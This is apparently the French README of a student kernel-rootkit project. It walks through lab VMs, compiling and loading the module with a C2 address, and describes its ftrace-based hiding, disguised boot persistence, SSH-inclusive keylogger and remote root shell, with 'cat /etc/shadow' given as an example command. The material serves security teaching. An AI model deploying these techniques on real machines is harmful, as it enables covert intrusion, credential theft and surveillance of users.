<p align="center">
  <img src="https://img.shields.io/badge/Kernel-Linux%206.1-orange?style=for-the-badge&logo=linux&logoColor=white" />
  <img src="https://img.shields.io/badge/Language-C%20%7C%20Python-blue?style=for-the-badge&logo=c&logoColor=white" />
  <img src="https://img.shields.io/badge/Crypto-ChaCha20--Poly1305-green?style=for-the-badge&logo=letsencrypt&logoColor=white" />
  <img src="https://img.shields.io/badge/UI-FastAPI%20%2B%20WebSocket-teal?style=for-the-badge&logo=fastapi&logoColor=white" />
  <img src="https://img.shields.io/badge/OS-Debian%2012-red?style=for-the-badge&logo=debian&logoColor=white" />
</p>

<h1 align="center">ZeroTrust</h1>
<h3 align="center">Wild Linux Kernel Object Module</h3>

<p align="center">
  <i>Rootkit Linux sous forme de module noyau (LKM) avec interface de commande et contrôle (C2) web.</i>
</p>

<p align="center">
  <b>EPITA - SYS2 - APPING1</b>
</p>

---

> **Avertissement** : Ce projet est réalisé dans un cadre strictement éducatif (projet EPITA SYS2).
> L'utilisation de rootkits en dehors d'un environnement de test contrôle est illégale.

---

## Table des matières

| # | Section | Description |
|---|---------|-------------|
| 1 | [Présentation du projet](#1---presentation-du-projet) | Vue d'ensemble, architecture, fonctionnalités |
| 2 | [Pré-requis](#2---pre-requis) | Matériel, logiciels, connaissances |
| 3 | [Installation de la virtualisation](#3---installation-de-lenvironnement-de-virtualisation) | QEMU/KVM sur Arch Linux, Ubuntu, Debian |
| 4 | [Création des machines virtuelles](#4---creation-des-machines-virtuelles) | Téléchargement ISO, creation VM, installation Debian |
| 5 | [Configuration VM Victime](#5---configuration-de-la-vm-victime) | Outils de compilation, headers noyau |
| 6 | [Configuration VM Attaquante](#6---configuration-de-la-vm-attaquante) | Python, venv, dépendances |
| 7 | [Compilation du rootkit](#7---compilation-du-rootkit) | make, verification du .ko |
| 8 | [Déploiement du rootkit](#8---deploiement-du-rootkit) | insmod, paramètres, verification |
| 9 | [Lancement du C2](#9---lancement-du-c2) | Démarrage serveur, connexion rootkit |
| 10 | [Utilisation de l'interface web](#10---utilisation-de-linterface-web) | Login, navigation, chaque panneau |
| 11 | [Fonctionnalités du rootkit](#11---fonctionnalités-du-rootkit) | Hooks, dissimulation, keylogger, protocole |
| 12 | [Fonctionnalités du C2](#12---fonctionnalités-du-c2) | API, WebSocket, architecture |
| 13 | [Architecture technique](#13---architecture-technique) | Structure du code, flux d'exécution |
| 14 | [Chiffrement](#14---sécurité-et-chiffrement) | ChaCha20-Poly1305, dérivation clé, format trames |
| 15 | [Dépannage](#15---depannage) | Problèmes courants et solutions |
| 16 | [Structure du projet](#16---structure-du-projet) | Arborescence, dépendances |

---

## 1 - Présentation du projet

### Qu'est-ce que WLKOM ?

WLKOM est un **rootkit Linux** qui fonctionne comme un **module noyau** (LKM - Loadable Kernel Module). Il s'installe sur une machine cible (la "victime") et permet à un attaquant de la contrôler à distance via une interface web.

### Comment ça marche (en résumé)

```
                          RESEAU LOCAL (NAT libvirt)
                         192.168.122.0/24

  ┌──────────────────────────────────────────────────────────────────┐
  │                                                                  │
  │    VM ATTAQUANTE                       VM VICTIME                │
  │    Debian 12                           Debian 12                 │
  │    192.168.122.96                      192.168.122.18            │
  │                                                                  │
  │   ┌──────────────────┐    TCP chiffré   ┌──────────────────┐    │
  │   │                  │   ChaCha20-Poly1305 │                  │    │
  │   │   Serveur C2     │◄────────────────►│   wlkom.ko       │    │
  │   │   (Python)       │   port 9999      │   (module noyau) │    │
  │   │                  │   port 9998      │                  │    │
  │   │   FastAPI        │                  │   ftrace hooks   │    │
  │   │   + WebSocket    │                  │   keylogger      │    │
  │   │   port 8080      │                  │   persistance    │    │
  │   │                  │                  │                  │    │
  │   └────────┬─────────┘                  └──────────────────┘    │
  │            │                                                     │
  └────────────┼─────────────────────────────────────────────────────┘
               │
               │ HTTP / WebSocket (port 8080)
               │
        ┌──────┴──────┐
        │  Navigateur  │
        │  web (hôte)  │
        │  Firefox /   │
        │  Chromium    │
        └─────────────┘
```

> Les IPs ci-dessus sont des exemples. Vos IPs seront différentes (voir section 4.5 pour les récupérer).

**En 3 étapes simples :**

1. On charge le module `wlkom.ko` dans le noyau de la victime
2. Le rootkit se connecte automatiquement au serveur C2 de l'attaquant
3. L'attaquant contrôle la victime depuis son navigateur web

### Fonctionnalités

| Fonctionnalité | Méthode |
|:---|:---|
| Compilation du module noyau | Makefile + linux-headers |
| Connexion persistante au C2 | TCP auto-reconnect (5s) |
| Persistance au reboot | modules-load.d + modprobe.d |
| Exécution de commandes à distance | call_usermodehelper + stdout/stderr/exit status |
| Authentification par mot de passe chiffré | SHA-256 hash via module_param |
| Upload de fichiers (attaquant → victime) | Protocole UPLOAD: taille + chunks |
| Download de fichiers (victime → attaquant) | Protocole FILE: + chunks + EOF |
| Dissimulation du module (lsmod, /proc, /sys) | list_del() + kobject_del() |
| Dissimulation de lignes dans fichiers (dmesg) | Hook sys_read via ftrace |
| Dissimulation de fichiers/dossiers (ls) | Hook sys_getdents64 via ftrace |
| Dissimulation des connexions réseau (ss/netstat) | Hook sys_recvmsg sur NETLINK_SOCK_DIAG |
| Dissimulation dans /proc/net/tcp | Filtrage hex du port/IP C2 |
| Dissimulation de processus (ps) | Hook getdents64 sur /proc |
| Chiffrement réseau | ChaCha20-Poly1305 AEAD |
| Keylogger | keyboard_notifier + TTY sniffer (SSH inclus) |
| Interface web C2 complète | Dashboard temps réel, 15+ panneaux |
| Navigateur de fichiers distant | Browse, view, upload, download, delete |
| Gestionnaire de processus distant | ps + kill depuis l'interface |
| Sniffer réseau | tcpdump intégré |
| Déploiement/Désinstallation à distance | Compilation + chargement depuis le web |
| Mapping MITRE ATT&CK | Cartographie des techniques utilisées |

---

## 2 - Pré-requis

### Matériel nécessaire

| Composant | Minimum | Recommandé |
|:---|:---|:---|
| RAM | 6 Go | 8 Go ou plus |
| Disque libre | 15 Go | 25 Go |
| CPU | Virtualisation (VT-x / AMD-V) | 4 cœurs |
| Réseau | Non requis (tout est local) | - |

> **Comment vérifier la virtualisation ?**
> ```bash
> # Si cette commande affiche un nombre > 0, votre CPU supporte la virtualisation
> egrep -c '(vmx|svm)' /proc/cpuinfo
> ```

### Logiciels sur la machine hôte

La machine hôte = votre PC physique (le laptop de l'école sous Arch Linux par exemple).

| Logiciel | Rôle | Comment vérifier |
|:---|:---|:---|
| QEMU/KVM | Hyperviseur (exécute les VMs) | `qemu-system-x86_64 --version` |
| libvirt | Gestion des VMs | `virsh --version` |
| virt-manager | Interface graphique pour les VMs | `virt-manager --version` |
| SSH client | Connexion aux VMs | `ssh -V` |
| Navigateur web | Accéder au C2 | Firefox / Chromium |

### Système des VMs

Les deux VMs utilisent **Debian 12 (Bookworm)**.

| | VM Victime | VM Attaquante |
|:---|:---|:---|
| **OS** | Debian 12 | Debian 12 |
| **Noyau** | 6.1.0-44-amd64 | 6.1.0-49-amd64 |
| **Role** | Execute le rootkit | Execute le C2 |
| **IP** | Attribuee par DHCP (voir section 4.5) | Attribuee par DHCP (voir section 4.5) |
| **Utilisateur** | `victim` / `victim` | `attacker` / `attacker` |
| **Root** | `root` / `root` | `root` / `root` |

> **Pourquoi Debian 12 (Bookworm) et pas une version plus récente ?**
>
> - **Noyau 6.1 LTS** : version Long Term Support maintenue jusqu'en décembre 2026. Le kernel 6.1 est la dernière version LTS compatible avec `ftrace_set_filter_ip()` sans modifications majeures de l'API. Les noyaux plus récents (6.5+) ont modifié certaines structures internes de ftrace (cf. commit `dda4d22`), ce qui compliquerait le code de hooking sans apporter de bénéfice pour un rootkit pédagogique.
> - **Headers noyau stables** : les `linux-headers-6.1.0-*` sont disponibles directement via `apt`, ce qui évite de compiler un noyau custom. Les versions rolling-release (Arch, Fedora) changent de noyau à chaque mise à jour, cassant potentiellement la compilation du module.
> - **API crypto noyau** : le module `chacha20poly1305` (`<crypto/chacha20poly1305.h>`) est présent et fonctionnel dans le 6.1. Certaines distributions plus récentes ont déplacé ou renommé ces headers.
> - **`kallsyms_lookup_name` non exporté depuis Linux 5.7** : on utilise la technique `kprobe` pour résoudre les symboles, qui fonctionne de manière fiable sur le 6.1 (pas de restrictions supplémentaires comme sur le 6.6+ avec `CONFIG_SECURITY_LOCKDOWN`).
> - **Reproductibilité** : Debian 12.0.0 est une version figée (archivée sur `cdimage.debian.org`). N'importe qui peut télécharger exactement le même ISO et obtenir le même environnement, contrairement à une version "current" qui évolue.
> - **Sources** : [Kernel LTS releases](https://www.kernel.org/category/releases.html), [Debian 12 release notes](https://www.debian.org/releases/bookworm/releasenotes)

---

## 3 - Installation de l'environnement de virtualisation

### Option A : Arch Linux (laptop de l'école)

**Étape 1** - Installer les paquets :

```bash
sudo pacman -S qemu-full virt-manager libvirt dnsmasq ebtables
```

**Étape 2** - Activer le service libvirt :

```bash
sudo systemctl enable --now libvirtd
```

**Étape 3** - Ajouter votre utilisateur au groupe libvirt :

```bash
sudo usermod -aG libvirt $(whoami)
```

> **Important** : Déconnectez-vous de votre session et reconnectez-vous pour que le changement prenne effet.

**Étape 4** - Activer le réseau virtuel par défaut :

```bash
sudo virsh net-start default
sudo virsh net-autostart default
```

**Étape 5** - Vérifier :

```bash
virsh list --all
```

> Si cette commande s'exécute sans erreur (même si la liste est vide), tout est bon.

---

### Option B : Ubuntu / Debian

**Étape 1** - Installer les paquets :

```bash
sudo apt update
sudo apt install -y qemu-kvm libvirt-daemon-system virt-manager bridge-utils
```

**Étape 2** - Activer le service :

```bash
sudo systemctl enable --now libvirtd
```

**Étape 3** - Ajouter l'utilisateur au groupe :

```bash
sudo usermod -aG libvirt $(whoami)
```

**Étape 4** - Déconnexion / reconnexion puis vérifier :

```bash
virsh list --all
```

---

### Vérification finale

Si vous voyez un tableau (même vide), l'installation est réussie :

```
 Id   Name   State
-----------------------
```

Si vous avez une erreur du type `Failed to connect to the hypervisor`, vérifiéz que libvirtd tourne :

```bash
sudo systemctl status libvirtd
```

---

## 4 - Création des machines virtuelles

### 4.1 - Télécharger l'ISO Debian 12

Lien de telechargement :

```
https://cdimage.debian.org/cdimage/archive/12.0.0/amd64/iso-cd/
```

Télécharger le fichier `debian-12.0.0-amd64-netinst.iso` (~600 Mo).

```bash
cd ~/Downloads
wget https://cdimage.debian.org/cdimage/archive/12.0.0/amd64/iso-cd/debian-12.0.0-amd64-netinst.iso
```

> C'est le même ISO pour les deux VMs (attaquante et victime). Une seule copie suffit.

Vérifiez que le fichier est bien télécharge :

```bash
ls -lh ~/Downloads/debian-12*.iso
```

---

### 4.2 - Créer la VM Victime

**Étape 1** - Ouvrez virt-manager :

```bash
virt-manager
```

<!-- SCREENSHOT: virt-manager fenêtre principale -->
<!-- ![virt-manager](screenshots/virt-manager-main.png) -->

**Étape 2** - Cliquez sur le bouton **"+"** (Créer une nouvelle machine virtuelle) en haut à gauche.

**Étape 3** - Source d'installation :
- Sélectionnez : **"Media d'installation local (image ISO ou CDROM)"**
- Cliquez **Suivant**

**Étape 4** - Sélectionnez l'ISO :
- Cliquez **Parcourir** → **Parcourir en local**
- Naviguez vers `~/Downloads/` et selectionnez l'ISO Debian 12 telechargee
- Le systèmedétecte automatiquement "Debian 12"
- Cliquez **Suivant**

<!-- SCREENSHOT: sélection de l'ISO dans virt-manager -->
<!-- ![ISO selection](screenshots/virt-manager-iso.png) -->

**Étape 5** - Mémoire et CPU :
```
Mémoire (RAM) : 2048 Mo
CPUs          : 2
```
- Cliquez **Suivant**

**Étape 6** - Stockage :
```
Créer un disque pour la VM : 10 Go
```
- Cliquez **Suivant**

**Étape 7** - Paramètres finaux :
```
Nom : victim
```
- Cochez : **"Personnaliser la configuration avant l'installation"**
- Réseau : vérifiéz que c'est **"Réseau virtuel 'default' : NAT"**
- Cliquez **Terminer**

<!-- SCREENSHOT: configuration finale VM (nom, réseau) -->
<!-- ![VM config](screenshots/virt-manager-config.png) -->

**Étape 8** - Dans la fenêtre de configuration qui s'ouvre, cliquez **"Commencer l'installation"** en haut à gauche.

---

### 4.3 - Installer Debian 12 (pour chaque VM)

L'installateur Debian se lance. Suivez ces étapes :

| Étape | Choix |
|:---|:---|
| Langue | Francais (ou English) |
| Pays | France |
| Clavier | Francais (azerty) |
| Nom de la machine | `victim` (ou `attacker` pour la 2e VM) |
| Nom de domaine | *(laisser vide)* |
| Mot de passe root | `root` (ou celui de votre choix) |
| Nom complet du nouvel utilisateur | `Victim User` (ou `Attacker User` pour la 2e VM) |
| Identifiant (login) | `victim` (ou `attacker` pour la 2e VM) |
| Mot de passe utilisateur | `victim` (ou `attacker` pour la 2e VM) |
| Partitionnement | **"Assiste - utiliser un disque entier"** |
| Schema de partition | **"Tout dans une seule partition"** |
| Miroir Debian | Voir ci-dessous |
| Proxy | *(laisser vide)* |
| Popularity contest | Non |

**Configuration du miroir Debian :**

- Sélectionnez `France` → `deb.debian.org`.
- **Si ça boucle** (retour a l'écran précédent) : la VM n'a pas accès à internet. Choisissez **"Revenir en arriere"** puis **"Continuer sans miroir réseau"**. Vous configurerez le miroir après l'installation (voir ci-dessous).

**Selection des logiciels** (ecran important) :

- **DECOCHEZ TOUT** sauf :
  - [x] Serveur SSH
  - [x] Utilitaires usuels du système
- Pas besoin d'environnement de bureau graphique

**Installation de GRUB** :
- Installer GRUB sur le disque principal : **Oui**
- Périphérique : `/dev/vda`

Attendez la fin de l'installation, retirez l'ISO et redémarrez.

**Si vous avez sauté l'étape du miroir** : après le reboot, connectez-vous en root et exécutez :

```bash
cat > /etc/apt/sources.list << 'EOF'
deb http://deb.debian.org/debian bookworm main
deb http://deb.debian.org/debian bookworm-updates main
deb http://security.debian.org/debian-security bookworm-security main
EOF
apt update
apt install -y openssh-server
```

Cela configure le miroir et installe le serveur SSH (nécessaire pour la suite).

---

### 4.4 - Créer la VM Attaquante

Répétez **exactement** les étapes 4.2 et 4.3, avec cette seule difference :

| Paramètre | VM Victime | VM Attaquante |
|:---|:---|:---|
| Nom de la VM | `victim` | `attacker` |
| Hostname | `victim` | `attacker` |
| Mot de passe root | `root` | `root` |
| Login utilisateur | `victim` | `attacker` |
| Mot de passe utilisateur | `victim` | `attacker` |

Tout le reste est identique (2 Go RAM, 2 CPUs, 10 Go disque, Debian 12, même sélection de logiciels).

---

### 4.5 - Récupérer les adresses IP

> **IMPORTANT** : Les adresses IP sont attribuees automatiquement par le serveur DHCP de libvirt.
> **Chaque machine aura des IPsdifférentes.** Les IPs utilisees dans ce document (`192.168.122.X`) sont des **exemples**.
> Vous **devez** récupérer vos propres IPs et les utiliser à la place.

Une fois les deux VMs démarrées, connectez-vous directement sur la console de chaque VM (via la fenêtre virt-manager, pas en SSH) avec `root` / `root` et exécutez :

```bash
ip -4 addr show
```

Cherchez l'interface réseau qui à une IP en `192.168.122.X` :

```
2: enp1s0: <BROADCAST,MULTICAST,UP,LOWER_UP> ...
    inet 192.168.122.18/24 brd 192.168.122.255 scope global dynamic enp1s0
```

> Le nom de l'interface peut varier selon votre configuration : `enp1s0`, `ens3`, `eth0`... Peu importe le nom, c'est l'IP qui compte.

**Notez les deux IPs.** Par exemple :

| VM | IP (exemple) | Votre IP |
|:---|:---|:---|
| Victime | `192.168.122.18` | *a completer* |
| Attaquante | `192.168.122.96` | *a completer* |

> **Dans toute la suite de ce document**, quand vous voyez `192.168.122.18`, remplacez par **l'IP de votre VM Victime**.
> Quand vous voyez `192.168.122.96`, remplacez par **l'IP de votre VM Attaquante**.

Vous pouvez aussi récupérer les IPs depuis la machine hôte avec :

```bash
# Liste toutes les VMs et leurs IPs attribuees par libvirt
virsh net-dhcp-leases default
```

Sortie exemple :

```
 Expiry Time           MAC address         IP address          Hostname
 2026-06-24 15:30:00   52:54:00:xx:xx:xx   192.168.122.18/24   victim
 2026-06-24 15:30:00   52:54:00:yy:yy:yy   192.168.122.96/24   attacker
```

### 4.6 - Tester la connectivite

Depuis la **machine hôte** (votre PC), remplacez les IPs par les votres :

```bash
# Ping la VM Victime (remplacez par votre IP)
ping -c 2 <IP_VICTIME>

# Ping la VM Attaquante (remplacez par votre IP)
ping -c 2 <IP_ATTAQUANTE>
```

Depuis la **VM Attaquante** :

```bash
# Ping la VM Victime (remplacez par votre IP)
ping -c 2 <IP_VICTIME>
```

> Si les pings fonctionnent (0% packet loss), la connectivite est OK.

> Les 3 commandes doivent reussir. Si le ping echoue, vérifiéz que le réseau `default` de libvirt est actif (`sudo virsh net-start default`).

---

## 5 - Configuration de la VM Victime

Connectez-vous à la VM Victime.

> **Important** : Par défaut, Debian n'autorise PAS la connexion SSH directe en tant que root.
> Il faut d'abord se connecter avec le compte utilisateur crée pendant l'installation, puis passer root.

```bash
# 1. Se connecter avec l'utilisateur de la VM Victime
ssh victim@192.168.122.18
# Mot de passe : victim

# 2. Une fois connecte, passer root
su -
# Mot de passe : root
```

> Remplacez `192.168.122.18` par l'IP de votre VM Victime (voir section 4.5).
>
> A partir de maintenant, toutes les commandes sont exécutées en **root** dans la VM.

### 5.1 - Installer les outils de compilation

```bash
apt update
apt install -y build-essential linux-headers-$(uname -r) gcc make
```

### 5.2 - Vérifier l'installation

```bash
# Vérifier que les headers du noyau sont installés
ls /lib/modules/$(uname -r)/build/Makefile
```

> Si le fichier existe, les headers sont OK.

```bash
# Vérifier le compilateur
gcc --version
# Doit afficher : gcc (Debian 12.2.0-14) 12.2.0 ou similaire

# Vérifier make
make --version
# Doit afficher : GNU Make 4.3 ou similaire

# Vérifier la version du noyau
uname -r
# Doit afficher : 6.1.0-44-amd64 ou similaire
```

### 5.3 - Créer le répertoire de travail

```bash
mkdir -p /root/wlkom/rootkit
```

---

## 6 - Configuration de la VM Attaquante

Connectez-vous à la VM Attaquante (même méthode que pour la victime) :

```bash
# 1. Se connecter avec l'utilisateur de la VM Attaquante
ssh attacker@192.168.122.96
# Mot de passe : attacker

# 2. Passer root
su -
# Mot de passe : root
```

> Remplacez `192.168.122.96` par l'IP de votre VM Attaquante (voir section 4.5).

### 6.1 - Installer Python et les outils

```bash
apt update
apt install -y python3 python3-venv python3-pip sshpass
```

### 6.2 - Créer l'environnement virtuel Python

```bash
python3 -m venv /opt/wlkom-c2
```

### 6.3 - Installer les dépendances Python

```bash
/opt/wlkom-c2/bin/pip install fastapi uvicorn[standard] websockets cryptography
```

### 6.4 - Vérifier l'installation

```bash
/opt/wlkom-c2/bin/python3 -c "
import fastapi, uvicorn, websockets
print('FastAPI   :', fastapi.__version__)
print('Uvicorn   :', uvicorn.__version__)
print('WebSockets:', websockets.__version__)
print('=> Tout est OK')
"
```

Sortie attendue :
```
FastAPI   : 0.136.1
Uvicorn   : 0.47.0
WebSockets: 16.0
=> Tout est OK
```

### 6.5 - Créer l'arborescence

```bash
mkdir -p /opt/wlkom-c2/server
mkdir -p /opt/wlkom-c2/rootkit
```

---

## 7 - Compilation du rootkit

### 7.1 - Copier les sources vers la VM Victime

Depuis la **machine hôte**, dans le répertoire du projet :

```bash
cd wlkom/

# Copier le code source vers la VM Victime (remplacez l'IP par la votre)
scp rootkit/wlkom.c victim@192.168.122.18:/tmp/
scp rootkit/Makefile victim@192.168.122.18:/tmp/
# Mot de passe : victim
```

Ensuite, connectez-vous à la VM et déplacez les fichiers en root :

```bash
ssh victim@192.168.122.18
# Mot de passe : victim
su -
# Mot de passe : root
mv /tmp/wlkom.c /root/wlkom/rootkit/
mv /tmp/Makefile /root/wlkom/rootkit/
```

### 7.2 - Compiler

Toujours en root dans la VM Victime :

```bash
cd /root/wlkom/rootkit
make
```

**Sortie attendue :**

```
make -C /lib/modules/6.1.0-44-amd64/build M=/root/wlkom/rootkit modules
make[1]: Entering directory '/usr/src/linux-headers-6.1.0-44-amd64'
  CC [M]  /root/wlkom/rootkit/wlkom.o
  MODPOST /root/wlkom/rootkit/Module.symvers
  CC [M]  /root/wlkom/rootkit/wlkom.mod.o
  LD [M]  /root/wlkom/rootkit/wlkom.ko
make[1]: Leaving directory '/usr/src/linux-headers-6.1.0-44-amd64'
```

### 7.3 - Vérifier

```bash
# Le fichier doit exister et peser environ 300-500 Ko
ls -lh /root/wlkom/rootkit/wlkom.ko

# Vérifier les infos du module
modinfo /root/wlkom/rootkit/wlkom.ko
```

Sortie de `modinfo` :

```
filename:       /root/wlkom/rootkit/wlkom.ko
version:        1.4
description:    Wild Linux Kernel Object Module
author:         wlkom
license:        GPL
parm:           pw_hash:charp
parm:           c2_ip:charp
parm:           c2_port:int
```

<!-- SCREENSHOT: compilationréussie (sortie make + modinfo) -->
<!-- ![Compilation](screenshots/compilation.png) -->

### 7.4 - Nettoyage (optionnel)

Pour supprimer les fichiers intermédiaires :

```bash
make clean
```

> Celasupprime tout sauf `wlkom.c` et `Makefile`. Relancez `make` pour recompiler.

---

## 8 - Déploiement du rootkit

### 8.1 - Choisir un mot de passe

Le rootkit utilise un mot de passe pour l'authentification. Ce mot de passe n'est **pas stocké en clair** dans le module : on passe uniquement son **hash SHA-256**.

Calculez le hash de votre mot de passe :

```bash
echo -n "wlkom2024" | sha256sum | awk '{print $1}'
```

> Remplacez `wlkom2024` par le mot de passe de votre choix.

Le hash ressemble a : `a1b2c3d4e5f6...` (64 caracteres hexadecimaux).

### 8.2 - Charger le rootkit

Sur la **VM Victime** :

```bash
insmod /root/wlkom/rootkit/wlkom.ko \
  pw_hash="$(echo -n 'wlkom2024' | sha256sum | awk '{print $1}')" \
  c2_ip="192.168.122.96" \
  c2_port=9999
```

**Explication des paramètres :**

| Paramètre | Description | Exemple |
|:---|:---|:---|
| `pw_hash` | Hash SHA-256 du mot de passe | `$(echo -n 'wlkom2024' \| sha256sum \| awk '{print $1}')` |
| `c2_ip` | IP de la VM Attaquante | `192.168.122.96` |
| `c2_port` | Port d'ecoute du C2 | `9999` |

> **Remplacez** `192.168.122.96` par l'IP réelle de votre VM Attaquante !

### 8.3 - Vérifier le chargement

```bash
dmesg | tail -10
```

**Sortie attendue** (visible uniquement juste après le chargement) :

```
[xxx.xxx] wlkom: module loaded
[xxx.xxx] wlkom: persistance set
[xxx.xxx] wlkom: module hidden
[xxx.xxx] wlkom: hide filesactivé (ftrace)
[xxx.xxx] wlkom: hide linesactivé (ftrace)
[xxx.xxx] wlkom: crypto ready (chacha20-poly1305)
[xxx.xxx] wlkom: net hiding ready (port=270F ip=...)
[xxx.xxx] wlkom: ss hidingactivé (recvmsg hook)
[xxx.xxx] wlkom: keylogger started
[xxx.xxx] wlkom: C2 thread started
```

> **Attention** : une fois actif, le rootkit filtre `dmesg` et ces lignes disparaissent !

<!-- SCREENSHOT: sortie dmesg après chargement du rootkit -->
<!-- ![dmesg](screenshots/dmesg-loaded.png) -->

### 8.4 - Vérifier la dissimulation

Après quelques secondes, le rootkit se cache complètement :

```bash
# Module invisible dans lsmod
lsmod | grep wlkom
# (aucun résultat = OK)

# Module invisible dans /proc/modules
cat /proc/modules | grep wlkom
# (aucun résultat = OK)

# Module invisible dans /sys/module
ls /sys/module/ | grep wlkom
# (aucun résultat = OK)

# Fichiers du rootkit cachés dans ls
ls /root/wlkom/
# (dossier semble vide = OK)

# Connexion cachee dans ss
ss -tnp | grep 9999
# (aucun résultat = OK)
```

<!-- SCREENSHOT: preuves de dissimulation (lsmod vide, ls vide, ss vide) -->
<!-- ![Stealth proof](screenshots/stealth-proof.png) -->

### 8.5 - Persistence au reboot

Le rootkit configure **automatiquement** sa persistance lors du premier chargement. Voici ce qu'il fait :

```
1. Copie wlkom.ko → /lib/modules/$(uname -r)/extra/zroot.ko
2.Crée /etc/modules-load.d/zroot.conf     (chargement auto au boot)
3.Crée /etc/modprobe.d/zroot.conf          (paramètres : hash, IP, port)
4. Execute depmod -a                        (met à jour la base des modules)
```

Après un reboot de la VM Victime, le rootkit se charge automatiquement et se reconnecte au C2.

> **Nom "zroot"** : le module est copie sous le nom `zroot.ko` pour la discretion (pas de reference a "wlkom" dans les fichiers de config).

---

## 9 - Lancement du C2

### 9.1 - Copier le C2 sur la VM Attaquante

Depuis la **machine hôte** :

```bash
cd wlkom/

# Copier les fichiers vers la VM Attaquante (remplacez l'IP par la votre)
scp attacking_program/c2.py attacker@192.168.122.96:/tmp/
scp rootkit/wlkom.c attacker@192.168.122.96:/tmp/
# Mot de passe : attacker
```

Connectez-vous et déplacez les fichiers en root :

```bash
ssh attacker@192.168.122.96
# Mot de passe : attacker
su -
# Mot de passe : root
mv /tmp/c2.py /opt/wlkom-c2/server/c2.py
mv /tmp/wlkom.c /opt/wlkom-c2/rootkit/wlkom.c
```

### 9.2 - Démarrer le serveur C2

Toujours en root dans la **VM Attaquante** :

**Option A** - Lancement au premier plan (voir les logs en direct) :

```bash
/opt/wlkom-c2/bin/python3 /opt/wlkom-c2/server/c2.py
```

**Option B** - Lancement en arrière-plan (le serveur continue même si vous fermez le terminal) :

```bash
nohup /opt/wlkom-c2/bin/python3 /opt/wlkom-c2/server/c2.py > /tmp/c2.log 2>&1 &
```

Pour consulter les logs :

```bash
cat /tmp/c2.log
```

**Sortie attendue au demarrage :**

```
INFO:     Started server process [XXXX]
INFO:     Waiting for application startup.
INFO:     Application startup complete.
INFO:     Uvicorn running on http://0.0.0.0:8080 (Press CTRL+C to quit)
[C2] Crypto key derived (ChaCha20-Poly1305)
[C2] Rootkit listener on port 9999
[C2] Command listener on port 9998
```

### 9.3 - Connexion automatique du rootkit

Si le rootkit est déjà chargé sur la victime, il se connecte **automatiquement** en moins de 5 secondes.

Vous verrez dans les logs :

```
[C2] Rootkit connected from ('192.168.122.18', XXXXX)
```

### 9.4 - Accéder a l'interface web

Ouvrez un navigateur sur la **machine hôte** et allez a :

```
http://192.168.122.96:8080
```

> Remplacez `192.168.122.96` par l'IP de votre VM Attaquante.

<!-- SCREENSHOT: logs du C2 au demarrage + connexion rootkit -->
<!-- ![C2 startup](screenshots/c2-startup-logs.png) -->

---

## 10 - Utilisation de l'interface web

### 10.1 - Authentification (deux niveaux)

L'interface a **deux niveaux de sécurité** :

---

**Niveau 1 : Mot de passe de la plateforme web**

| | |
|:---|:---|
| Quand | A l'ouverture de la page web |
| Mot de passe | `zerotrust` (modifiable dans Settings) |
| Tentatives | 3 avant verrouillage de 30 secondes |
| Session | Dure 1 heure, renouvelée à chaque action |

Entrez `zerotrust` et cliquez **Login**.

<!-- SCREENSHOT: page de login du C2 -->
<!-- ![Login page](screenshots/c2-login.png) -->

---

**Niveau 2 : Mot de passe du rootkit**

| | |
|:---|:---|
| Quand | Après le login, dans le Terminal |
| Mot de passe | Celui choisi au chargement (`wlkom2024` dans cet exemple) |
| Affichage | Le terminalaffiche `Password:` |

Allez dans **Terminal** (menu à gauche), le promptaffiche :

```
[*] Rootkit connected - password required
Password: _
```

Tapez le mot de passe du rootkit (ex: `wlkom2024`) et appuyez Entrée.

```
[+] Authenticated successfully
root@victim:/# _
```

> Vous êtes maintenant connecté avec un **acces root complet** à la machine victime.

<!-- SCREENSHOT: terminal après authentificationréussie -->
<!-- ![Terminal auth](screenshots/c2-terminal-auth.png) -->

---

### 10.2 - Les panneaux de l'interface

Voici la liste complète des panneaux accessibles depuis le menu lateral :

---

#### Dashboard

Vue d'ensemble du système.

| Information | Description |
|:---|:---|
| Connection status | État de la connexion avec le rootkit (connecté / déconnecté) |
| System info | OS, noyau, hostname, uptime de la victime |
| Metrics | CPU, RAM, disque de la victime |

<!-- SCREENSHOT: dashboard avec statusconnecté -->
<!-- ![Dashboard](screenshots/c2-dashboard.png) -->

---

#### Terminal

Terminal interactif pour executer des commandes sur la victime.

Le terminalaffiche pour chaque commande :
- **stdout** : la sortie standard de la commande
- **stderr** : les messages d'erreur (affiches en rouge)
- **exit status** : le code de retour (0 = succes, autre = erreur)

Exemples de commandes :

```bash
whoami                    # → root                    (exit: 0)
hostname                  # → victim                  (exit: 0)
ls -la /etc/              # → liste des fichiers      (exit: 0)
cat /etc/shadow           # → hashes des mots de passe(exit: 0)
cat /fichier/inexistant   # → stderr: No such file    (exit: 1)
ip addr                   # → interfaces réseau       (exit: 0)
ps aux                    # → processus en cours      (exit: 0)
```

**Commandes speciales :**

| Commande | Action |
|:---|:---|
| `cd <dossier>` | Change le répertoire courant |
| `upload <chemin>` | Envoie un fichier vers la victime |
| `download <chemin>` | Télécharge un fichier depuis la victime |
| `clear` | Efface l'écran du terminal |

<!-- SCREENSHOT: terminal en action avec commandes exécutées -->
<!-- ![Terminal](screenshots/c2-terminal.png) -->

---

#### File System

Navigateur de fichiers de la machine victime.

| Action | Icone | Description |
|:---|:---:|:---|
| Naviguer | Clic sur dossier | Parcourir l'arborescence |
| Voir un fichier | **View** | Affiche le contenu texte |
| Télécharger fichier | **DL** | Télécharge sur votre machine |
| Télécharger dossier | **.tar.gz** | Archive le dossier et télécharge |
| Envoyer un fichier | **Upload** | Envoie un fichier depuis votre machine |
| Supprimer | Poubelle (rouge) | Supprime avec confirmation |

<!-- SCREENSHOT: navigateur de fichiers -->
<!-- ![File System](screenshots/c2-filesystem.png) -->

---

#### Processes

Liste des processus en cours sur la victime (equivalent de `ps aux`).

- Affiche : PID, utilisateur, CPU%, MEM%, commande
- Bouton **Kill** pour terminer un processus (envoie `SIGKILL`)

<!-- SCREENSHOT: liste des processus -->
<!-- ![Processes](screenshots/c2-processes.png) -->

---

#### Network

Informations réseau de la victime : interfaces, IP, routes, connexions.

---

#### Downloads

Liste des fichiers telecharges depuis la victime. Vous pouvez les sauvegarder sur votre machine.

---

#### Sniffer

Capture de paquets réseau sur la victime (utilise `tcpdump`).

- Démarre / arrête la capture
- Affiche les paquets en temps reel

---

#### Keylogger

Capture des frappesclavier de la victime.

| Source | Methode |
|:---|:---|
| Console physique | keyboard_notifier (noyau) |
| Sessions SSH | Hook sys_read sur TTY/PTY |

- Le keylogger démarre automatiquement au chargement du rootkit
- Bouton **Dump** pour récupérer le buffer

